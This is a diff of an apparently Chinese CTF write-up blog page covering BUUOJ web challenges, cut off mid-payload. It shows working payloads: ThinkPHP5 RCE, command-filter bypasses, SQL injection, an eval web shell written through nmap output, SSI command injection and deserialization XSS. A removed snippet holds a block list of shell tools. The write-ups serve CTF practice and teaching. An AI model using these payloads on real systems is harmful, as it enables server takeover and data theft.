@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      7.6k 字
+      8.1k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      112
+      118
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：几秒前
+                  本文最后更新于：1 分钟前
                 
               </p>
             
@@ -319,8 +319,7 @@ $host = escapeshellcmd($host);
 <p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
 <p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p>
 <p>(写的有点乱)</p>
-<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开页面出现了提示</p>
-<p><img src="https://i.loli.net/2020/10/24/e2hpjI7tioY3gN9.png" srcset="/img/loading.gif" alt="cve.png"></p>
+<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开页面出现了提示  <code>BY THINKPHP5</code></p>
 <p>这里应该是php5的漏洞利用，和攻防世界的一道题比较像<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">传送门</a></p>
 <p>先看看报错信息:1 <code>url+?s=1</code></p>
 <p><img src="https://i.loli.net/2020/10/24/3H6YjEuRLQfGl28.png" srcset="/img/loading.gif" alt="cve-1.png"></p>
@@ -335,7 +334,8 @@ $host = escapeshellcmd($host);
 <div class="hljs"><pre><code class="hljs dts">url
 <span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</code></pre></div>
 
-<p><img src="https://i.loli.net/2020/10/24/VBW2Xg7yfmR4ciE.png" srcset="/img/loading.gif" alt="cve-3.png"></p>
+
+
 <h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><div class="hljs"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you
 <span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;
 $flag=<span class="hljs-string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;
@@ -396,57 +396,13 @@ Njk2ZTY0NjU3ODJlNzA2ODcw
 
 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre></div>
 
-<p><img src="https://i.loli.net/2020/10/24/vQ5dSRXbJZ6Yagn.png" srcset="/img/loading.gif" alt="web-4.png"></p>
+
+
+
+
 <p><img src="https://i.loli.net/2020/10/24/ZfMW62Ik1L5adpz.png" srcset="/img/loading.gif" alt="web-1.png"></p>
 <p>base64解码后</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-error_reporting(E_ALL || ~ E_NOTICE);
-header(<span class="hljs-string">'content-type:text/html;charset=utf-8'</span>);
-$cmd = $_GET[<span class="hljs-string">'cmd'</span>];
-<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'img'</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>])) 
-    header(<span class="hljs-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);
-$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));
-
-$file = preg_replace(<span class="hljs-string">"/[^a-zA-Z0-9.]+/"</span>, <span class="hljs-string">""</span>, $file);
-<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/i"</span>, $file)) &#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;
-    <span class="hljs-keyword">die</span>(<span class="hljs-string">"xixiï½ no flag"</span>);
-&#125; <span class="hljs-keyword">else</span> &#123;
-    $txt = base64_encode(file_get_contents($file));
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="hljs-string">"'&gt;&lt;/img&gt;"</span>; <span class="hljs-comment">//将555.png的内容以base64形式显示</span>
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
-&#125;
-<span class="hljs-keyword">echo</span> $cmd;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
-<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123; <span class="hljs-comment">//cmd参数进行了过滤</span>
-    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"forbid ~"</span>);
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>;
-&#125; <span class="hljs-keyword">else</span> &#123;
-    <span class="hljs-keyword">if</span> ((string)$_POST[<span class="hljs-string">'a'</span>] !== (string)$_POST[<span class="hljs-string">'b'</span>] &amp;&amp; md5($_POST[<span class="hljs-string">'a'</span>]) === md5($_POST[<span class="hljs-string">'b'</span>])) &#123;<span class="hljs-comment">// md5强碰撞</span>
-        <span class="hljs-keyword">echo</span> `$cmd`;
-    &#125; <span class="hljs-keyword">else</span> &#123;
-        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"md5 is funny ~"</span>);
-    &#125;
-&#125;
-
-<span class="hljs-meta">?&gt;</span>
-&lt;html&gt;
-&lt;style&gt;
-  body&#123;
-   background:url(./bj.png)  no-repeat center center;
-   background-size:cover;
-   background-attachment:fixed;
-   background-color:<span class="hljs-comment">#CCCCCC;</span>
-&#125;
-&lt;/style&gt;
-&lt;body&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">'img'</span>])));
-<span class="hljs-comment">//这里将img的值两次base64解码后赋值给了file变量</span>
-...
-$txt = base64_encode(file_get_contents($file));<span class="hljs-comment">//这里存在file_get_contents()函数，直接读取文件的内容</span></code></pre></div>
-
+<p><img src="https://i.loli.net/2021/01/08/x3jpitoCluR6TEg.png" srcset="/img/loading.gif" alt="image-20210108204318609"></p>
 <p>这题还对一些系统命令进行了过滤，这里需要想办法绕过</p>
 <p>ls，不可以使用，但是dir没有过滤，可以使用<code>dir%20/</code>读取目录</p>
 <p>cat被过滤了，但是可以使用<code>ca\t</code>绕过，<code>ca\t%20/flag</code></p>
@@ -457,44 +413,13 @@ $txt = base64_encode(file_get_contents($file));<span class="hljs-comment">//这�
 <div class="hljs"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>
 &amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span></code></pre></div>
 
-<p><img src="https://i.loli.net/2020/10/24/N5pyKHGSTAYas3n.png" srcset="/img/loading.gif" alt="web-2.png"></p>
+<p>直接查看目录 <code>dir /</code></p>
+<p>获取flag</p>
+<div class="hljs"><pre><code class="hljs angelscript">ca\t%<span class="hljs-number">20</span>/flag</code></pre></div>
+
 <p><img src="https://i.loli.net/2020/10/24/lfOzTIEwbBJDaMx.png" srcset="/img/loading.gif" alt="web-3.png"></p>
-<p>参考： <a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p>
 <h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-
-<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;
-
-$yds = <span class="hljs-string">"dog"</span>;
-$is = <span class="hljs-string">"cat"</span>;
-$handsome = <span class="hljs-string">'yds'</span>;
-
-<span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;<span class="hljs-comment">//$flag=flag</span>
-    $$x = $y;
-&#125;
-$flag = flag 
-
-<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;  <span class="hljs-comment">//yds=flag</span>
-    $$x = $$y; <span class="hljs-comment">//$yds = $flag </span>
-&#125;
-
-<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;
-    <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">'flag'</span>] === $x &amp;&amp; $x !== <span class="hljs-string">'flag'</span>)&#123; <span class="hljs-comment">// yds=flag</span>
-        <span class="hljs-keyword">exit</span>($handsome);
-    &#125;
-&#125;
-
-<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'flag'</span>]))&#123;
-    <span class="hljs-keyword">exit</span>($yds);
-&#125;
-
-<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>  || $_GET[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>)&#123;
-    <span class="hljs-keyword">exit</span>($is);
-&#125;
-
-
-<span class="hljs-keyword">echo</span> <span class="hljs-string">"the flag is: "</span>.$flag;</code></pre></div>
-
+<p><img src="https://i.loli.net/2021/01/08/yBrChYxGJt6w81c.png" srcset="/img/loading.gif" alt="image-20210108204543551"></p>
 <p>poyload:</p>
 <div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag
 POST: <span class="hljs-variable">$flag</span>=flag</code></pre></div>
@@ -924,7 +849,8 @@ header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>
 <p>测试是否存在sql注入</p>
 <p>在申请广告是输入标题<code>1&#39;111</code>，提交正常，但是当查看广告详情的时候出现了报错页面，这也说明了存在sql注入,而且是二次注入</p>
 <p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094728350.png" srcset="/img/loading.gif" alt="image-20201216094728350"></p>
-<h3 id="0x1sql注入"><a href="#0x1sql注入" class="headerlink" title="0x1sql注入"></a>0x1sql注入</h3><p>查看列数，空格是被加入了黑名单，使用/**/代替空格，一直加到了22才出现回显。</p>
+<p><strong>0x1sql注入</strong></p>
+<p>查看列数，空格是被加入了黑名单，使用/**/代替空格，一直加到了22才出现回显。</p>
 <div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>
 
 <p><img src="https://i.loli.net/2020/12/16/YLCR8ODt2wiSWfZ.png" srcset="/img/loading.gif" alt="image-20201216095035895"></p>
@@ -988,8 +914,10 @@ $serialize_info = filter(serialize($_SESSION));
 
 <p>第33行代码提示了phpinfo中有隐藏的东西，GET提交<code>f=phpinfo</code>，会在里面找到一个文件的名字<strong>d0g3_f1ag.php</strong></p>
 <p>那么接下来的目的就是通过一些方法读取到里面的信息。可以看到最后一行存在一个 file_get_content函数，结合题目标题，可以猜到是反序列化加文件读取的题目。</p>
-<h3 id="0x1代码审计"><a href="#0x1代码审计" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><p>代码最后一行有一个<code>file_get_contents</code>是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’，可以发现如果我们有传入img_path，它会经过sha1加密，导致目标路径失效。如果我们没有传入img_path，那么后台将默认赋值为guest_img.png的base64编码。这样看来这个<code>$userinfo[&#39;img&#39;]</code>并不是我们可控的，此时需要把注意力转移到另外一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>都会被空格替代，而这层过滤函数会干扰序列化后的数据。</p>
-<h3 id="0x2php反序列化字符逃逸"><a href="#0x2php反序列化字符逃逸" class="headerlink" title="0x2php反序列化字符逃逸"></a>0x2php反序列化字符逃逸</h3><p>利用过滤函数而导致序列化结果产生新的结果，之前写过类似的<a href="https://sunzy.icu/2020/11/17/UNCTF/" target="_blank" rel="noopener">文章</a></p>
+<p><strong>0x1代码审计</strong></p>
+<p>代码最后一行有一个<code>file_get_contents</code>是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’，可以发现如果我们有传入img_path，它会经过sha1加密，导致目标路径失效。如果我们没有传入img_path，那么后台将默认赋值为guest_img.png的base64编码。这样看来这个<code>$userinfo[&#39;img&#39;]</code>并不是我们可控的，此时需要把注意力转移到另外一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>都会被空格替代，而这层过滤函数会干扰序列化后的数据。</p>
+<p><strong>0x2php反序列化字符逃逸</strong></p>
+<p>利用过滤函数而导致序列化结果产生新的结果，之前写过类似的<a href="https://sunzy.icu/2020/11/17/UNCTF/" target="_blank" rel="noopener">文章</a></p>
 <p><img src="https://i.loli.net/2020/12/20/37JhPXH6GqbeuSI.png" srcset="/img/loading.gif" alt="image-20201220213459548"></p>
 <p>这里重新构造出的序列化值为：</p>
 <div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"user"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">24</span>:<span class="hljs-string">""</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div>
@@ -1231,6 +1159,93 @@ $c = <span class="hljs-keyword">new</span> HelloPhp;
 <div class="hljs"><pre><code class="hljs xml">' -oN b.phtml <span class="php"><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">eval</span>($_POST[a]);<span class="hljs-meta">?&gt;</span></span>'</code></pre></div>
 
 <p>访问 /b.phtml，发现是可以访问的，所以蚁剑链接，拿到flag</p>
+<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫描目录可以发现网页备份文件<code>index.php.swp</code></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+	ob_start();
+	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span><span class="hljs-params">()</span></span>&#123;
+		$chars = <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;
+		$random = $chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span>
+		$content = uniqid().$random;
+		<span class="hljs-keyword">return</span> sha1($content); 
+	&#125;
+    header(<span class="hljs-string">"Content-Type: text/html;charset=utf-8"</span>);
+	***
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">'username'</span>] != <span class="hljs-string">''</span> )
+    &#123;
+        $admin = <span class="hljs-string">'6d0bc1'</span>;
+        <span class="hljs-keyword">if</span> ( $admin == substr(md5($_POST[<span class="hljs-string">'password'</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;
+            $file_shtml = <span class="hljs-string">"public/"</span>.get_hash().<span class="hljs-string">".shtml"</span>;
+            $shtml = fopen($file_shtml, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to open file!"</span>);
+            $text = <span class="hljs-string">'</span>
+<span class="hljs-string">            ***</span>
+<span class="hljs-string">            ***</span>
+<span class="hljs-string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="hljs-string">'username'</span>].<span class="hljs-string">'&lt;/h1&gt;</span>
+<span class="hljs-string">            ***</span>
+<span class="hljs-string">			***'</span>;
+            fwrite($shtml,$text);
+            fclose($shtml);
+            ***
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"[!] Header  error ..."</span>;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;
+            
+    &#125;<span class="hljs-keyword">else</span>
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>代码审计</p>
+<blockquote>
+<p>1.第一个函数，是生成文件名，最后使用一个sha1函数，让文件名固定为32位</p>
+<p>2.之后的第一个if语句的判断，username值不能位空</p>
+<p>3.第二个password的md5值前六位等于 “6d0bc1”</p>
+<p>4.之后的利用生成文件名的函数，生成一个文件(shtml)，并打开文件向其中写入$text</p>
+<p>5.其中的username的值被带入$text中，所以这里存在注入</p>
+</blockquote>
+<p><strong>Apache SSI 远程命令执行漏洞</strong></p>
+<p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<code>&lt;!--#exec cmd=&quot;id&quot;--&gt;</code>语法执行命令。</p>
+<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
+<p><strong>1.绕过第一个if语句</strong></p>
+<div class="hljs"><pre><code class="hljs perl">$admin == <span class="hljs-keyword">substr</span>(md5($_POST[<span class="hljs-string">'password'</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)</code></pre></div>
+
+<p>利用脚本找到两个</p>
+<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">51302775</span>
+<span class="hljs-number">2020666</span></code></pre></div>
+
+<p><strong>2.在network中找到生成的文件</strong></p>
+<p><img src="https://i.loli.net/2020/12/30/TxgJ4uZ6paf3s28.png" srcset="/img/loading.gif" alt="image-20201230090520608"></p>
+<p><img src="https://i.loli.net/2020/12/30/pkPSdoEK5Dgi2hJ.png" srcset="/img/loading.gif" alt="image-20201230090618525"></p>
+<p><strong>3.命令注入</strong></p>
+<p>首先列出目录</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd="ls ../"--&gt;</span></code></pre></div>
+
+<p>可以看到<code>flag_990c66bf85a09c664f0b6741840499b2</code>，直接访问，即可拿到flag</p>
+<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>扫描目录发现 /.git文件，git源码泄露，githack下载源码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$a = $_GET[<span class="hljs-string">'yds_is_so_beautiful'</span>];
+<span class="hljs-keyword">echo</span> unserialize($a);</code></pre></div>
+
+<p>源码很简单，就是get提交一个参数后，进行反序列化，但是没有给出序列化过程，不知道类的结构</p>
+<p><strong>php原生类利用</strong></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);
+<span class="hljs-keyword">echo</span> urlencode(serialize($a));</code></pre></div>
+
+<p>序列化后的内容为</p>
+<div class="hljs"><pre><code class="hljs angelscript">O%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Exception%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A25%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ealert%<span class="hljs-number">281</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00f</span>ile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fusercode%<span class="hljs-number">2</span>Ffile.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A19%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span 